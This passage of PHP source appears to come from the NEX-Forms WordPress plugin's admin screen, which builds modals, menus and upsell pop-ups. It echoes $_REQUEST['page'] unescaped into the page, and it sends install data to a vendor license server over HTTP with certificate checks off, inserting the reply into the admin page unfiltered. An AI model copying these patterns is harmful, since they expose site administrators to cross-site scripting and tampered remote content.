									  $output .= '</div>
									  
									  
									</div>
								</div>
							</div>
						</div> 
					</div>  
						';

//HIDDEN FIELDS		
		$output .= '<div class="modal fade in  admin-modal" id="setup_hidden_fields" data-task-target="task-hidden-fields" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="">
						<div class="modal-dialog preview-modal">
							
							<div class="modal-content">
								<div class="modal-header">
									<button type="button" class="minimize" data-dismiss="modal" aria-hidden="true"><span class="fa fa-minus"></span>&nbsp;</button><button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
									<h4 class="modal-title" id="myModalLabel">Add Hidden Fields</h4>
								  </div>
								<div class="modal-body">
									<div class="setup_hidden_fields_content"></div>
								</div>
							</div>
						</div> 
					</div>  
						';

//EMBED
	$output .= '<div class="modal fade in  admin-modal" id="embed_form" data-task-target="task-embed" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="">
							<div class="modal-dialog preview-modal">
								
								<div class="modal-content">
									<div class="modal-header">
										<button type="button" class="minimize" data-dismiss="modal" aria-hidden="true"><span class="fa fa-minus"></span>&nbsp;</button><button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
										<h4 class="modal-title" id="myModalLabel">Embed Form</h4>
									  </div>
									<div class="modal-body">
										
										<div role="tabpanel">

											  <!-- Nav tabs -->
											  <ul class="nav nav-tabs" role="tablist">
												<li role="presentation" class="active"><a href="#embed-shortcode" role="tab" data-toggle="tab">Shortcode</a></li>
												<li role="presentation"><a href="#embed-php" role="tab" data-toggle="tab">PHP</a></li>
												<li role="presentation"><a href="#embed-tiny-mce" role="tab" data-toggle="tab">TinyMCE (WP Editor)</a></li>
												<li role="presentation"><a href="#embed-sticky" role="tab" data-toggle="tab">Sticky</a></li>
												<li role="presentation"><a href="#embed-widget" role="tab" data-toggle="tab">Widget</a></li>

											  </ul>
											
											  <!-- Tab panes -->
											  <div class="tab-content panel">
												
												<div role="tabpanel" class="tab-pane active" id="embed-shortcode">
									 
													<div class="well well-sm sc_normal">
														<div class="copy_code">[NEXForms id="<span class="set_embed_id"></span>"]</div>
													</div>
													
													<div id="sc_normal_text" class="well well-sm sc_normal_text" style="display:none">
													</div>
													
													
													<h5>Popup&nbsp;&nbsp;<input placeholder="Button/link text" name="popup_text" class="form-control" value="">&nbsp;&nbsp;<select name="popup_type" class="form-control"><option value="button" selected="selected">--- Select Type ---</option><option value="button">Button</option><option value="link">Link</option></select>&nbsp;&nbsp;
													 
													 <select name="popup_button_color" class="form-control">
														 <option value="btn-primary" selected="selected">--- Color ---</option>
														 <option value="btn-primary" class="btn-primary">Dark Blue</option>
														 <option value="btn-info" class="btn-info">Light Blue</option>
														 <option value="btn-warning" class="btn-warning">Orange</option>
														 <option value="btn-success" class="btn-success">Green</option>
														 <option value="btn-danger" class="btn-danger">Red</option>
														 <option value="btn-default" class="btn-default">Gray/White</option>
													 </select>
													</h5>
													
													<div class="well well-sm sc_popup_button">
														<div class="copy_code">[NEXForms id="<span class="set_embed_id"></span>" open_trigger="popup" button_color="<span class="popup_button_color">btn-primary</span>" type="<span class="popup_type">button</span>" text="<span class="popup_text">Open Form</span>""]</div>
													</div>
													 
													 <div class="well well-sm sc_popup_button_text" style="display:none">
													</div>
													 
													 
													 
													
												</div>
												
												<div role="tabpanel" class="tab-pane" id="embed-php">
													
													<div class="well well-sm php_normal">
														&lt;?php NEXForms_ui_output(<span class="set_embed_id"></span>,true); ?&gt;
													 	<div class="fa fa-question-circle" data-placement="left" data-toggle="popover" data-content="Copy this function into your theme\'s template pages"></div>
													 </div>
													 
													 <h5>Popup&nbsp;&nbsp;<input placeholder="Button/link text" name="popup_text" class="form-control" value="">&nbsp;&nbsp;<select name="popup_type" class="form-control"><option value="button" selected="selected">--- Select Type ---</option><option value="button">Button</option><option value="link">Link</option></select>&nbsp;&nbsp;
													 
													 <select name="popup_button_color" class="form-control">
														  <option value="btn-primary" selected="selected">--- Color ---</option>
														 <option value="btn-primary" class="btn-primary">Dark Blue</option>
														 <option value="btn-info" class="btn-info">Light Blue</option>
														 <option value="btn-warning" class="btn-warning">Orange</option>
														 <option value="btn-success" class="btn-success">Green</option>
														 <option value="btn-danger" class="btn-danger">Red</option>
														 <option value="btn-default" class="btn-default">Gray/White</option>
													 </select>
													 
													 </h5>
													 <div class="well well-sm php_popup_button">
														&lt;?php NEXForms_ui_output(array("id"=><span class="set_embed_id"></span>,"open_trigger"=>"popup", "button_color"=>"<span class="popup_button_color">btn-primary</span>", type"=>"<span class="popup_type">button</span>", "text"=>"<span class="popup_text">Open Form</span>"); ?&gt;
													 <div class="fa fa-question-circle" data-placement="left" data-toggle="popover" data-content="Copy this function into your theme\'s template pages to display a button or link that will trigger a popup. <br><br>Note: You can add your own button or link CSS class by changing the button_color variable."></div>
													
													 </div>
										 
														
												</div>
												
												<div role="tabpanel" class="tab-pane" id="embed-tiny-mce">
													<div class="well well-sm">Add forms to pages/posts from the WordPress TinyMCE Editor. See image below.</div>
													<div class="well well-sm" style="text-align:center">
														<img src="'.plugins_url( '/images/embed_tinymce.png',dirname(dirname(__FILE__))).'">
										 			</div>
												
												</div>
												
												<div role="tabpanel" class="tab-pane" id="embed-widget">
													
													<div class="well well-sm">Go to Appearance->Widgets and drag the NEX-Forms widget into the desired sidebar. You will be able to select this form from the dropdown options.</div>
										 
													
												</div>
												
												<div role="tabpanel" class="tab-pane" id="embed-sticky">
													
													<div class="well well-sm">Go to Appearance->Widgets and drag the NEX-Forms widget into the desired sidebar. You will be able to select this form from the dropdown options. <br />
													<br />You can use the widget to create slide-in <strong>sticky forms</strong>.</div>
										 			
												
												</div>
												
												
												
												
												
											</div>
										</div>
									</div>
								</div>
							</div> 
						</div>  
						';
//PREVIEW
	$output .= '<div class="modal fade in  admin-modal" data-task-target="task-preview" id="preview_form" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="">
							<div class="modal-dialog preview-modal">
								
								<div class="modal-content">
									<div class="modal-header">
										<button type="button" class="minimize" data-dismiss="modal" aria-hidden="true"><span class="fa fa-minus"></span>&nbsp;</button><button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
										<h4 class="modal-title" id="myModalLabel">Form Preview
										
										<button class="change_device btn btn-default desktop"><span class="fa fa-desktop"></button>
										<button class="change_device btn btn-default laptop"><span class="fa fa-laptop"></button>
										<button class="change_device btn btn-default tablet"><span class="fa fa-tablet"></button>
										<button class="change_device btn btn-default mobile"><span class="fa fa-mobile"></button>
										
										<button class="form-preview btn btn-success"><span class="fa fa-refresh"></button>
										</h4>
									  </div>
									<div class="modal-body" style="background:#fff">
										<div class="loading load_preview">Loading <i class="fa fa-circle-o-notch fa-spin"></i></div>
										<iframe class="show_form_preview" src="" style="display:none;"></iframe>
									</div>
								</div>
							</div> 
						</div>  
						';

//VIEW ENTRIES
	$output .= '<div class="modal fade in  admin-modal" id="load_form_entries" data-task-target="task-entries" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="">
							<div class="modal-dialog preview-modal">
								
								<div class="modal-content">
									<div class="modal-header">
										<button type="button" class="minimize" data-dismiss="modal" aria-hidden="true"><span class="fa fa-minus"></span>&nbsp;</button><button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
										<h4 class="modal-title" id="myModalLabel">Form Entries</h4>
									  </div>
									<div class="modal-body" style="background:#fff">';
										
										$output .= '<input type="hidden" name="page" value="'.$_REQUEST['page'].'">';
										$output .= '<input type="hidden" name="orderby" value="">';
										$output .= '<input type="hidden" name="order" value="desc">';
										$output .= '<input type="hidden" name="current_page" value="0">';
					
										
										$output .= '<div class="pagination-links"></div>';
									
										
										
										$output .= '<div class="form_entries_panel_content"></div>';
										
										$output .= '
									</div>
								</div>
							</div> 
						</div>  
						';
//FIRST RUN
	$api_params2 = array( 'check_key' => 1,'ins_data'=>get_option('7103891'),'paypal_in_use'=>( is_plugin_active( 'nex-forms-paypal-add-on/main.php' )) ? 1 : 0);
	$response2 = wp_remote_post( 'http://basixonline.net/activate-license', array('timeout'   => 30,'sslverify' => false,'body'  => $api_params2) );
	$license_checked = $response2['body'];
	$output .= '<div class="modal fade in  admin-modal" id="first_run" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="">
							<div class="modal-dialog preview-modal">
								
								<div class="modal-content">
									<div class="modal-header">
										<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
										<h4 class="modal-title" id="myModalLabel"></h4>
									  </div>
									<div class="modal-body">
										
										<div class="class="alert alert-success"><h1 >LIMITED OFFER!!!</h1></div>
										<p>Receive all add-ons FREE to the value of <strong>$88</strong> with a purchase of <a target="_blank" href="https://codecanyon.net/item/nexforms-the-ultimate-wordpress-form-builder/7103891?ref=Basix">NEX-Forms PRO</a>!!!
										<h3>Available Add-ons:</h3>
										<div class="row">
										<div class="col-xs-2"><a target="_blank" href="https://codecanyon.net/item/form-to-postpage-for-nexforms/19538774?ref=Basix" class="ao-fp">Form to Post</a></div>
											<div class="col-xs-2"><a target="_blank" href="https://codecanyon.net/item/mailchimp-for-nexforms/18030221?ref=Basix" class="ao-mc">MailChimp</a></div>
											<div class="col-xs-2"><a target="_blank" href="https://codecanyon.net/item/getresponse-for-nexforms/18462247?ref=Basix" class="ao-gr">GetResponse</a></div>
											<div class="col-xs-2"><a target="_blank" href="https://codecanyon.net/item/paypal-for-nexforms/12311864?ref=Basix" class="ao-pp">PayPal</a></div>
											<div class="col-xs-2"><a target="_blank" href="https://codecanyon.net/item/form-themes-for-nexforms/10037800?ref=Basix" class="ao-ft">Form Themes</a></div>
											<div class="col-xs-2"><a target="_blank" href="https://codecanyon.net/item/export-to-pdf-for-nexforms/11220942?ref=Basix" class="ao-pdf">Export to PDF</a></div>
											<div class="col-xs-2"><a target="_blank" href="https://codecanyon.net/item/digital-signatures-for-nexforms/17044658?ref=Basix" class="ao-ds">Digital Signatures</a></div>
										</div>
									</div>
									
									<div class="modal-footer">
									';
									if($license_checked)
										$output .= '<label for="show_first_run"><input type="checkbox" id="show_first_run" name="show_first_run"> Dont show this again</label>';
									
									$output .= '<button class="btn btn-default" data-dismiss="modal">&nbsp;&nbsp;&nbsp;'.(($license_checked) ? 'Close' : 'Remind me later').'&nbsp;&nbsp;&nbsp;</button>';
									$output .= '&nbsp;&nbsp;<a target="_blank" href="https://codecanyon.net/item/nexforms-the-ultimate-wordpress-form-builder/7103891?ref=Basix" class="btn btn-success">&nbsp;&nbsp;&nbsp;GET THIS OFFER NOW&nbsp;&nbsp;&nbsp;</a>';
									
									$output .= '</div>
									
								</div>
							</div> 
						</div>  
						';
						
				


//DEMO
	$output .= '<div class="modal fade in  admin-modal" id="demo" tabindex="-1" data-backdrop="static" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="">
							<div class="modal-dialog preview-modal">
								
								<div class="modal-content">
									<div class="modal-header">
										<h4 class="modal-title" id="myModalLabel">NEX-Forms version 6 Demo</h4>
									  </div>
									<div class="modal-body">
										 <h3>Welcome to the new way of form building!</h3>
										 <p>
										  NEX-Forms 6 comes with tons of new innovative features that no other form builder provides. This is the only form builder that includes a fully customizable grid, a styling toolbar, taskbar and many other unique features! Try out the 34+ form elements and the settings that come with them.
										  </p>
										   <p>
										  We hope your enjoy this as much as we did creating it to make online form building as easy as it can be.
										  </p>
										
									</div>
									
									<div class="modal-footer">
										<a href="#" class="tutorial btn btn-info" data-dismiss="modal"><i class="fa fa-comment"></i> Lets take a quick tour of the back-end</a>
									</div>
									
								</div>
							</div> 
						</div>  
						';


//SAVED FORMS
			$output .= '<div class="modal fade in" id="conditional_logic_window" data-task-target="task-con-logic" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false" style="">
							<div class="modal-dialog preview-modal">
								
								<div class="modal-content">
									<div class="modal-header">
										<button type="button" class="minimize" data-dismiss="modal" aria-hidden="true"><span class="fa fa-minus"></span>&nbsp;</button><button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
										<h4 class="modal-title" id="myModalLabel">Conditional Logic <div class="advanced_cl_options"><label for="adv_cl"><input type="checkbox" name="adv_cl" id="adv_cl" value="1"><span class="the_label">Show Advanced Options</span></label></div></h4>
									  </div>
									<div class="modal-body conditional_logic simple_view">
										
											';
											
											$output .= '<div class="col-sm-12">';
					
						
						
						
					
						$output .= '<div class="inner">';
							
							$output .= '<div class="conditional_logic_clonables hidden">';
							
							
							$output .= '<div class="panel new_rule">';
								$output .= '<div class="panel-heading advanced_options"><button aria-hidden="true" class="close delete_rule" type="button"><span class="fa fa-close "></span></button></div>';
								$output .= '<div class="panel-body">';
									//IF
									$output .= '<div class="col-xs-6 con_col">';
										$output .= '<h3 class="advanced_options"><strong><div class="badge rule_number">1</div>IF</strong> ';
											$output .= '<select id="operator" style="width:15%; float:none !important; display: inline" class="form-control" name="selector">';
												$output .= '<option value="any" selected="selected"> any </option>';
												$output .= '<option value="all"> all </option>';
											$output .= '</select> ';
										$output .= 'of these conditions are true</h3>';
										$output .= '<div class="get_rule_conditions">';
											$output .= '<div class="the_rule_conditions">';
											$output .= '<span class="statment_head"><div class="badge rule_number">1</div>IF</span> <select name="fields_for_conditions" class="form-control cl_field" style="width:33%;">';
													$output .= '<option selected="selected" value="0">-- Field --</option>';
												$output .= '</select>';
												$output .= '<select name="field_condition" class="form-control" style="width:28%;">';
													$output .= '<option selected="selected" value="0">-- Condition --</option>';
													$output .= '<option value="equal_to">Equal To</option>';
													$output .= '<option value="not_equal_to">Not Equal To</option>';
													$output .= '<option value="less_than">Less Than</option>';
													$output .= '<option value="greater_than">Greater Than</option>';
													/*$output .= '<option value="contains">Contains</option>';
													$output .= '<option value="not_contians">Does not Contain</option>';
													$output .= '<option value="is_empty">Is Empty</option>';*/
												$output .= '</select>';
												$output .= '<input type="text" name="conditional_value" class="form-control" style="width:28%;" placeholder="enter value">';
												$output .= '<button class="btn btn-sm btn-default delete_condition advanced_options" style="width:11%;"><span class="fa fa-close"></span></button><div style="clear:both;"></div>';
										$output .= '</div>';
									$output .= '</div>';
										
										$output .= '<button class="btn btn-sm btn-default add_condition advanced_options" style="width:100%;">Add Condition</button>';
									$output .= '</div>';
									
									//THEN
									$output .= '<div class="col-xs-4 con_col">';
										$output .= '<h3 class="advanced_options" style="">THEN</h3>';
										$output .= '<div class="get_rule_actions">';
											$output .= '<div class="the_rule_actions">';
											$output .= '<span class="statment_head">THEN</span> <select name="the_action" class="form-control" style="width:40%;">';
												$output .= '<option selected="selected" value="0">-- Action --</option>';
												$output .= '<option value="show">Show</option>';
												$output .= '<option value="hide">Hide</option>';
											$output .= '</select>';
											$output .= '<select name="cla_field" class="form-control" style="width:45%;">';
											$output .= '</select>';
											$output .= '<button class="btn btn-sm btn-default delete_action advanced_options" style="width:15%;"><span class="fa fa-close"></span></button>';
											
														
											$output .= '</div>';
										$output .= '</div>';
										$output .= '<button class="btn btn-sm btn-default add_action advanced_options" style="width:100%;">Add Action</button>';
										
									$output .= '</div>';
									
									//ELSE
										$output .= '<div class="con_col col-xs-2" >';
											$output .= '<h3 class="advanced_options" style="">ELSE</h3>';
											$output .= '<span class="statment_head">ELSE</span> <select name="reverse_actions" class="form-control">';
												$output .= '<option selected="selected" value="true">Reverse Actions</option>';
												$output .= '<option value="false">Do Nothing</option>';
											$output .= '</select>';
											$output .= '<button class="btn btn-sm btn-default delete_simple_rule" style="width:15%;"><span class="fa fa-close"></span></button>
											
											<div style="clear:both;"></div>';
										$output .= '</div>';
								$output .= '</div>';
							$output .= '</div>';
							
							
							
							
							
							
							
							
							$output .= '<div class="set_rule_conditions">';
								$output .= '<select name="fields_for_conditions" class="form-control cl_field" style="width:33%;">';
									$output .= '<option selected="selected" value="0">-- Field --</option>';
								$output .= '</select>';
								$output .= '<select name="field_condition" class="form-control" style="width:28%;">';
									$output .= '<option selected="selected" value="0">-- Condition --</option>';
									$output .= '<option value="equal_to">Equal To</option>';
									$output .= '<option value="not_equal_to">Not Equal To</option>';
									$output .= '<option value="less_than">Less Than</option>';
									$output .= '<option value="greater_than">Greater Than</option>';
									/*$output .= '<option value="contains">Contains</option>';
									$output .= '<option value="not_contians">Does not Contain</option>';
									$output .= '<option value="is_empty">Is Empty</option>';*/
								$output .= '</select>';
								$output .= '<input type="text" name="conditional_value" class="form-control" style="width:28%;" placeholder="enter value">';
								$output .= '<button class="btn btn-sm btn-default delete_condition" style="width:11%;"><span class="fa fa-close"></span></button><div style="clear:both;"></div>';
							$output .= '</div>';
							
							
							$output .= '<div class="set_rule_actions">';
								
								$output .= '<select name="the_action" class="form-control" style="width:40%;">';
									$output .= '<option selected="selected" value="0">-- Action --</option>';
									$output .= '<option value="show">Show</option>';
									$output .= '<option value="hide">Hide</option>';
								$output .= '</select>';
								$output .= '<select name="cla_field" class="form-control" style="width:45%;">';
								$output .= '</select>';
								$output .= '<button class="btn btn-sm btn-default delete_action" style="width:15%;"><span class="fa fa-close"></span></button><div style="clear:both;"></div>';
							$output .= '</div>';
							
						
						
						
						$output .= '</div>';
						
						$output .= '<div id="field-settings-inner" class="conditions_wrapper">';
							$output .= '<div class="set_rules">';
							$output .= '</div>';
						$output .= '</div>';
						
						
						
					$output .= '</div>';
					
					
				$output .= '</div>';
											
											
											
									$output .= '<div style="clear:both"></div></div>';
									$output .= '<div class="modal-footer">';
										$output .= '<div id="add_new_rule" class="btn btn-info add_new_rule">';
											$output .= '<span class="fa fa-plus"></span> <span class="btn-tx">Add new rule</span>';
										$output .= '</div>';
									$output .= '</div>';
									
								$output .= '</div>
							</div> 
						</div>  
						';


//DOCS
$output .= '<div class="modal fade in  admin-modal" id="documentation" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="">
					  <div class="modal-dialog preview-modal">
						<div class="modal-content">
						  <div class="modal-header alert alert-success">
							<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
							<h4 class="modal-title" id="myModalLabel">Documentation</h4>
						  </div>
						  <div  class="modal-body">
							<iframe class="show_docs" height="100%" width="100%" class="docs_view" src=""></iframe>
						  </div>
						  
						 
						</div>
					  </div>
					</div>';

//DOCS
$output .= '<div class="modal fade in  admin-modal" id="videos" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="">
				  <div class="modal-dialog preview-modal">
					<div class="modal-content">
					  <div class="modal-header alert alert-success">
						<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
						<h4 class="modal-title" id="myModalLabel">Tutorial Videos</h4>
					  </div>
					  <div  class="modal-body">
						<iframe class="videos_view" height="100%" width="100%" class="videos_view" src=""></iframe>
					  </div>
					  
					  
					</div>
				  </div>
				</div>';


				
				$item = get_option('7103891');
				if(!get_option('1983017'.$item[0]))
					{
					$api_params = array( 'use_trail' => 1,'ins_data'=>get_option('7103891'));
					$response = wp_remote_post( 'http://basixonline.net/activate-license', array('timeout'   => 30,'sslverify' => false,'body'  => $api_params) );
					$output .= $response['body'];
					}
				
				//HIDDEN DOM ELEMENTS
				$output .= '<div class="form_type" style="display:none;">blank</div>';
				$output .= '<div class="site_url" style="display:none;">'.get_option('siteurl').'</div>';
				$output .= '<div class="admin_url" style="display:none;">'.admin_url().'</div>';
				$output .= '<div class="plugin_url" style="display:none;">'.plugins_url('',dirname(dirname(__FILE__))).'</div>';
				$output .= '<div class="plugins_path" style="display:none;">'.plugins_url('',dirname(dirname(dirname(__FILE__)))).'</div>';
				$output .= '<div id="the_plugin_url" style="display:none;">'.plugins_url('',dirname(dirname(__FILE__))).'</div>';
				$output .= '<div id="form_update_id" style="display:none;"></div>';
				
				//TOOLBAR
				$output .= '<div class="toolbar">';
					/*$output .= '<a class="menu-item show-dashboard">';
						$output .= '<i class="fa fa-dashboard"></i><br>Dashboard';
					$output .= '</a>';*/
					
					
					
					
					$output .= '
					<div class="dropdown menu-item">
					  <button class="btn btn-default dropdown-toggle nf_tutorial_step_1 nf_tutorial"  title="Main Menu - Forms <span class=\'fa fa-close\'></span>" data-content="
					  		Everything you need for your current open form is found in this menu.<br><br>Take note of the keyboard shortcuts.
							<div class=\'popover-footer\'>
								<div class=\'next_tut_step badge\'>
									<i class=\'fa fa-arrow-right\'></i>
								</div>
								<div class=\'prev_tut_step badge \'>
									<i class=\'fa fa-arrow-left\'></i>
								</div>
							</div>
						" type="button" id="dropdownMenu1" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
						Form
						<span class="caret"></span>
					  </button>
					  <ul class="dropdown-menu" aria-labelledby="dropdownMenu1">
					  	<li class="dropdown-header">My Forms</li>
					  	<li><a class="new_form"><i class="fa fa-file"></i> <u>N</u>ew</a><div class="shortcut-key">Ctrl+Alt+N</div></li>
						<li><a class="open-form"><i class="fa fa-folder-open"></i> Open</a><div class="shortcut-key">Ctrl+Alt+O</div></li>
						<li><a class="" id="upload_form"><i class="fa fa-cloud-upload"></i> Import</a> </li>
						
						<li role="separator" class="divider"></li>
						<li class="dropdown-header">Storage</li>
						<li><a class="save_nex_form"><i class="glyphicon glyphicon-floppy-disk"></i> Save</a> <div class="shortcut-key">Ctrl+Alt+S</div></li>
						<li><a class="save_nex_form is_template"><i class="fa fa-floppy-o"></i> Save as template</a> </li>
						<li><a class="disabled" id="export_current_form"><i class="fa fa-cloud-download"></i> Export</a></li>
						
						<li role="separator" class="divider"></li>
						<li class="dropdown-header">User interface</li>
						<li><a class="conditional-logic"><i class="fa fa-random"></i> Conditional logic</a> <div class="shortcut-key">Ctrl+Alt+C</div></li>						
					  	<li><a class="form-preview"><i class="fa fa-eye"></i> Preview</a> <div class="shortcut-key">Ctrl+Alt+P</div></li>
						<li><a class="form-embed disabled"><i class="fa fa-code"></i> Embed</a></li>';
						
						
						$output .= '
							<li role="separator" class="divider"></li>
							<li class="dropdown-header">Paypal</li>
							<li><a class="paypal-options paypal-setup"><i class="fa fa-gear"></i> Paypal Setup</a></li>						
							<li><a class="paypal-options map-items"><i class="fa fa-paypal"></i> Map Items</a></li>
							';
						
						
						
						$output .= '<li role="separator" class="divider"></li>
						<!--<li class="dropdown-header">Entries</li>
						<li><a class="form-entries disabled"><i class="fa fa-database"></i> View</a> <div class="shortcut-key">Ctrl+Alt+V</div></li>
						<li><a class="export-csv disabled"><i class="fa fa-file-excel-o"></i> Export to CSV</a></li>
						<li><a class="export-pdf disabled"><i class="fa fa-file-pdf-o"></i> Export to PDF</a></li>-->
						
						<li role="separator" class="divider"></li>
						<li class="dropdown-header">Submission</li>
						<li><a class="email-setup"><i class="fa fa-envelope"></i> Email setup</a> <div class="shortcut-key">Ctrl+Alt+E</div></li>
						<li><a class="form-options"><i class="fa fa-gear"></i> Submission options</a></li>
						<li><a class="pdf-setup"><i class="fa fa-file-pdf-o"></i> PDF Creator</a></li>
						<!--<li><a class="form-options"><i class="fa fa-random"></i> Server-side logic</a></li>-->
						<li><a class="add-hidden-fields"><i class="fa fa-eye-slash"></i> Hidden fields</a></li>
						
					  </ul>
					</div>
					';
					
					
					$output .= '
					<div class="dropdown menu-item">
					  <button class="btn btn-default dropdown-toggle nf_tutorial_step_2 nf_tutorial" type="button" id="dropdownMenu1" title="Main Menu - Edit <span class=\'fa fa-close\'></span>" data-content="
					  		All your default settings are found here like default preferences, global email configuration and front-end troubleshooting options.
							<div class=\'popover-footer\'>
								<div class=\'next_tut_step badge\'>
									<i class=\'fa fa-arrow-right\'></i>
								</div>
								<div class=\'prev_tut_step badge \'>
									<i class=\'fa fa-arrow-left\'></i>
								</div>
							</div>
						" type="button" id="dropdownMenu1" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
						Edit
						<span class="caret"></span>
					  </button>
					  <ul class="dropdown-menu" aria-labelledby="dropdownMenu1">
					  	<li class="dropdown-header">Global Settings (On Dashboard since v6.7)</li>
					  	
						
						<li><a href="'.get_admin_url().'admin.php?page=nex-forms-dashboard#global_settings" target="_blank" class=""><i class="fa fa-envelope"></i> Go to Dashboard->Global Settings</a></li>
						<!--<li><a class="global_email_settings"><i class="fa fa-envelope"></i> Email configuration</a></li>
						<li><a class="global_admin_settings"><i class="fa fa-gear"></i> WP Admin options</a></li>
						
						<li role="separator" class="divider"></li>
						<li class="dropdown-header">Email Subscription</li>
					  	<li><a class="setup_mail_chimp"><i class="fa fa-envelope"></i> MailChimp configuration</a></li>
						<li><a class="setup_get_response"><i class="fa fa-envelope"></i> GetResponse configuration</a></li>
						
						<li role="separator" class="divider"></li>
						<li class="dropdown-header">Trouble Shooting</li>
						<li><a class="ts-js-inc"><i class="fa fa-code"></i> Javascript inclusions</a></li>
						<li><a class="ts-css-inc"><i class="fa fa-code"></i> Stylesheet inclusions</a></li>
						
						
						
						<li role="separator" class="divider"></li>
						<li><a class="field-pref"><i class="fa fa-gears"></i> Preferences</a> <div class="shortcut-key">Ctrl+Alt+U</div></li>
						
						
						<li role="separator" class="divider"></li>
						<li><a class="license-info"><i class="fa fa-check-square-o"></i> License</a></li>-->
						
					  </ul>
					</div>
					';
					
					
					$output .= '
					<div class="dropdown menu-item">
					  <button class="btn btn-default dropdown-toggle nf_tutorial_step_3 nf_tutorial" type="button" id="dropdownMenu1" title="Main Menu - View <span class=\'fa fa-close\'></span>" data-content="
					  		From here you can create your own admin layout and preload any custom or default layout for different devices and screen resolutions.
							<div class=\'popover-footer\'>
								<div class=\'next_tut_step badge\'>
									<i class=\'fa fa-arrow-right\'></i>
								</div>
								<div class=\'prev_tut_step badge \'>
									<i class=\'fa fa-arrow-left\'></i>
								</div>
							</div>
						" type="button" id="dropdownMenu1" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
						View
						<span class="caret"></span>
					  </button>
					  <ul class="dropdown-menu" aria-labelledby="dropdownMenu1">
					  	<li class="dropdown-header">Form</li>
					  	<li><a class="form-preview"><i class="fa fa-eye"></i> Preview</a> <div class="shortcut-key">Ctrl+Alt+P</div></li>
						<li role="separator" class="divider"></li>
						<li class="dropdown-header">Admin Layout Presets</li>
						<li><a class="enable_custom_layout" data-layout="default" data-icon="fa-arrows"><i class="fa fa-arrows"></i> Default</a></li>
						<li><a class="enable_custom_layout" data-layout="desktop" data-icon="fa-desktop"><i class="fa fa-desktop"></i> Desktop</a></li>
						<li><a class="enable_custom_layout" data-layout="laptop" data-icon="fa-laptop"><i class="fa fa-laptop"></i> Laptop</a></li>
						<!--<li><a class="enable_custom_layout" data-layout="tablet" data-icon="fa-tablet"><i class="fa fa-tablet"></i> Tablet</a></li>-->
						<li role="separator" class="divider"></li>
						<li><a class="create_custom_layout"><i class="fa fa-columns"></i> Create Custom Layout </a></li>';
						
						$custom_layouts = get_option('nex-forms-custom-layouts');
						
							$output .= '<li role="separator" class="divider"></li>
							<li class="dropdown-header">Custom Layouts</li>
							<span class="the_custom_layouts">';
							if(!is_array($custom_layouts))
								$custom_layouts = array();
							foreach($custom_layouts as $custom_layout=>$val)
								$output .= '<li><a class="enable_custom_layout" data-layout="'.$custom_layout.'" data-icon="fa-check"><i class="fa fa-check"></i> '.$custom_layout.'</a><div class="delete_custom_layout"><span class="fa fa-close"></span></div><div class="edit_custom_layout"><span class="fa fa-edit"></span></div> </li>';
						
					 		$output .= '</span>';
							
							
								
					 
					$output .= ' </ul>
					</div>
					';
					$output .= '<div class="current_layout_attr hidden"></div>';
					$output .= '
					<div class="dropdown menu-item">
					  <button class="btn btn-default dropdown-toggle nf_tutorial_step_4 nf_tutorial" type="button" id="dropdownMenu1" title="Main Menu - Help <span class=\'fa fa-close\'></span>" data-content="
					  		You can find this tour, documentation, tutorial videos and online support from this menu.
							<div class=\'popover-footer\'>
								<div class=\'next_tut_step badge\'>
									<i class=\'fa fa-arrow-right\'></i>
								</div>
								<div class=\'prev_tut_step badge \'>
									<i class=\'fa fa-arrow-left\'></i>
								</div>
							</div>
						" type="button" id="dropdownMenu1" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
						Help
						<span class="caret"></span>
					  </button>
					  <ul class="dropdown-menu" aria-labelledby="dropdownMenu1">
					  	<li><a class="videos"><i class="fa fa-youtube"></i> Videos</a></li>
					  	<li><a class="tutorial"><i class="fa fa-comments"></i> Tour </a><div class="shortcut-key">Ctrl+Alt+F2</div></li> 
					  	<li><a class="docs"><i class="fa fa-question-circle"></i> Documentation</a> <div class="shortcut-key">Ctrl+Alt+F1</div></li> 
						<li><a class="get-support" target="_blank" href="http://basixonline.net/support-for-nex-forms-wordpress-form-builder/"><i class="fa fa-life-ring"></i> Support</a></li>
						<li role="separator" class="divider"></li>
						<li><a class="about_nf"><i class="fa fa-question"></i> About NEX-Forms</a></li>
					  </ul>
					  
					</div>
					';
					
					
				
					
				if(!$license_checked)
					{
					$output .= '<a class="tutorial btn btn-xs btn-info">TAKE A TOUR</a>';
					$output .= '<a class="btn btn-xs btn-success" href="https://codecanyon.net/item/nexforms-the-ultimate-wordpress-form-builder/7103891?ref=Basix" target="_blank"><strong>GET NEX-FORMS PRO</strong></a>';
					}
				$output .= '</div>';
				
				
				
				
				
				
				$output .= '<div class="modal fade in admin_animated zoomIn" id="viewFormEntry" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="z-index:10000000000 !important;">
						  <div class="modal-dialog">
							<div class="modal-content">
							  <div class="modal-header alert alert-info">
								<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
								<h4 class="modal-title" id="myModalLabel">Form Entry</h4>
							  </div>
							  <div class="modal-body">
								
							  </div>
							  <div class="modal-footer ">
								<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
							  </div>
							</div>
						  </div>
						</div>';
						
